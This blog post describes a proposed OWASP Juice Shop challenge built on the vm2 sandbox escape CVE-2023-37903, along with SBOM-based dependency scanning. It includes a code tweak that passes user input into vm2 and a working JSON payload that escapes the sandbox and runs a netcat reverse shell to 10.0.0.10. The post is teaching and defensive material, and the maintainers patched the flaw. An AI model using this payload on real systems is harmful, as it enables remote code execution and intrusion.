# Escaping the Sandbox: A Dependency Vulnerability RCE in OWASP Juice Shop

OWASP Juice Shop is a deliberately insecure web application disguised as an online store. It's intentionally packed with vulnerabilities, giving you a safe playground to hack, learn, and practice fixing real-world security flaws.

Recently, a community member, [Masoud Abdaal](https://github.com/MasoudAbdaal), proposed a brand-new Juice Shop challenge that's both terrifying and brilliant: exploit a **real-world dependency vulnerability**. Because, let's be honest, sometimes it's not your code that betrays you, it's that one shady npm package you installed at 2 AM.

The relevant code lives in [OWASP Juice Shop Commit cc75b13](https://github.com/juice-shop/juice-shop/tree/cc75b136f311942be6c18b4e940ffa0d3fef6689) and its chatbot dependency, [Juicy Chat Bot Commit 705832f](https://github.com/juice-shop/juicy-chat-bot/tree/705832f8e39fdf83804939a8f420c598ee293b50)

---

## The Villain: vm2 Sandbox

Juice Shop uses [`vm2`](https://www.npmjs.com/package/vm2), a Node.js sandboxing library. Think of vm2 as the bouncer at a sketchy nightclub. It's supposed to keep the chaos contained. Unfortunately, vm2 has had a history of vulnerabilities that basically let attackers walk right past the velvet rope.

One particularly nasty one is **CVE-2023-37903**:

* **Type:** Sandbox escape
* **Impact:** Remote Code Execution (RCE)
* **Severity:** "Why is the server suddenly mining Dogecoin?"

This maps neatly to **CWE-94: Improper Control of Code Generation** and **OWASP A08: Software and Data Integrity Failures**. 

Translation? You can trick vm2 into letting you run whatever code you want, like convincing the bouncer to hand you the keys to the bar.

---

## Setting Juice Shop Up for Trouble

To make Juice Shop juicy enough for the challenge, Masoud suggested a tiny tweak to the chatbot code:

```js
// https://github.com/juice-shop/juicy-chat-bot/blob/705832f8e39fdf83804939a8f420c598ee293b50/index.js

async respond(query, token) {
  const response = (await this.factory.run(query))
}
```

This little adjustment pipes untrusted user input directly into vm2.

---

## The Attack Flow (a.k.a. How to Break Things Systematically)

The challenge could guide learners through the full arc of supply chain villainy:

1. **Generate an SBOM (Software Bill of Materials).** Think of it as a shopping list of everything your app depends on. Spoiler: it's usually longer than your weekend grocery list.
2. **Import into Dependency-Track (or similar).** This is where the tool goes "Hey, your project depends on something… yikes."
3. **Spot the Vulnerability (CVE-2023-37903).** Time to connect the dots between npm packages and potential chaos.
4. **Craft a Payload.** By abusing symbols and `inspect.constructor`, you sneak access to Node's `process` object.
5. **Achieve RCE.** At this point, you're running arbitrary commands on the server, celebratory confetti optional.

---

## The Exploit (Don't Try This at Home… Unless Home Is Juice Shop)

Masoud showed off a proof-of-concept payload against the chatbot's `/rest/chatbot/respond` endpoint. It looks scary, but in plain English it's saying:

"Hey vm2, why don't you let me peek behind the curtain, grab Node's `child_process`, and run some good old-fashioned shell commands?"

```json
{
    "action":"query",
    "query":"const customInspectSymbol = Symbol.for(\"nodejs.util.inspect.custom\");\r\n\r\nobj = {\r\n    [customInspectSymbol]: (depth, opt, inspect) => {\r\n        inspect.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"nc.exe 10.0.0.10 4444 -e cmd.exe\");\r\n    },\r\n    valueOf: undefined,\r\n    constructor: undefined,\r\n}\r\n\r\nWebAssembly.compileStreaming(obj).catch(()=>{});"
}
```

Voila, you have a reverse shell on your server.

![Reverse Shell on Juice Shop](media/blog5/exploit.png)

---

## The Plot Twist: No Challenge After All

As exciting as this exploit sounded, the Juice Shop maintainers made the responsible call: instead of shipping a shiny new challenge, they patched the vulnerability.

And honestly, that's the right move. While it would've been a blast to hack away at a sandbox escape inside Juice Shop, leaving a live RCE lying around in an educational app would've been like teaching kids about fire safety by handing them a flamethrower. 

The good news? The patch keeps Juice Shop safe for learners while still leaving plenty of other vulnerabilities to explore. The bad news? We'll just have to dream of what could've been the most "explosive" Juice Shop challenge yet.

---

## Why This Matters

This challenge is more than just "hacking for fun." It drives home some uncomfortable truths:

* **Dependencies are your frenemy.** Your code might be flawless, but one vulnerable library and it's game over.
* **SBOMs are not optional.** If you don't know what's inside your app, you're basically running a mystery stew in production.
* **Exploitation bridges theory and reality.** Reading CVEs is good; actually exploiting one makes the lesson unforgettable.

---

## Takeaways

* Update your dependencies. Regularly. Religiously.
* Use SBOMs and tools like Dependency-Track, Snyk, or OWASP Dependency-Check.
* Don't blindly trust sandboxing libraries. Attackers treat them like escape rooms.
* And if you're learning? Juice Shop remains the safest place to break things without your boss calling you into a "serious meeting."

---

## Credit:

[MasoudAbdaal's GitHub Issue #2715](https://github.com/juice-shop/juice-shop/issues/2715)

[MasoudAbdaal's GitHub profile](https://github.com/MasoudAbdaal)
